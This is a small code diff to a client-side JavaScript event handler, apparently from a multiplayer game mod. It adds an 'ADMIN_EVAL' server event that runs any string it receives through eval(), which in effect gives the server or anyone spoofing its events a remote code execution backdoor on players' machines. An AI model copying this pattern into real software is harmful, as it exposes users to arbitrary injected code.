@@ -38,6 +38,9 @@ API.onServerEventTrigger.connect(function(event, args) {
 					clothCEF.destroy()
 					break
 			}		
-			break;
+			break
+		case "ADMIN_EVAL":
+			eval(args[0])
+			break
 	}
 })
